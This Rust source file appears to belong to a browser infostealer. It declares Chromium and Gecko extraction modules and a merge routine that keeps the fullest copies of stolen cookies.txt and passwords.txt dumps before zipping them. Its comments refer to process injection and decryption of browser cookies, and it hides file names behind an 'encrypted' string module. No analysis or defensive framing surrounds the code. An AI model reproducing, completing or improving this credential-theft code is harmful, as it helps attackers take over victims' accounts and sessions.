pub mod chromium;
pub mod gecko;
pub mod common;

/// Merge extraction results, keeping the version with more *valid* cookie lines
/// (non-empty value field). Prevents post-inject empty decrypts from overwriting
/// good pre-inject cookies.
pub fn merge_files(all_files: &mut Vec<(String, String)>, new_files: Vec<(String, String)>) {
    fn cookie_score(s: &str) -> (usize, usize) {
        let mut valid = 0usize;
        let mut total = 0usize;
        for line in s.lines() {
            let t = line.trim();
            if t.is_empty() || t.starts_with('#') {
                continue;
            }
            total += 1;
            let parts: Vec<&str> = t.split('\t').collect();
            if parts.len() >= 7 && !parts[6].is_empty() {
                valid += 1;
            }
        }
        (valid, total)
    }

    for (name, content) in new_files {
        let is_cookie_file = name.ends_with(&format!("/{}", crate::encrypted::s_cookies_txt()))
            || name.ends_with(&crate::encrypted::s_cookies_txt());
        let is_password_file = name.ends_with(&format!("/{}", crate::encrypted::s_passwords_txt()))
            || name.ends_with(&crate::encrypted::s_passwords_txt());

        if let Some(existing) = all_files.iter_mut().find(|(n, _)| n == &name) {
            if is_cookie_file {
                let (new_valid, new_total) = cookie_score(&content);
                let (old_valid, old_total) = cookie_score(&existing.1);
                if new_valid > old_valid || (new_valid == old_valid && new_total > old_total) {
                    existing.1 = content;
                }
            } else if is_password_file {
                let score = |s: &str| {
                    s.lines()
                        .filter(|l| l.trim().starts_with("URL:") || l.contains("Username:"))
                        .count()
                };
                if score(&content) >= score(&existing.1) && !content.trim().is_empty() {
                    existing.1 = content;
                }
            } else if !content.trim().is_empty()
                && content.len() > existing.1.len()
            {
                existing.1 = content;
            }
        } else {
            all_files.push((name, content));
        }
    }
    common::zipp::sort_entries(all_files);
}
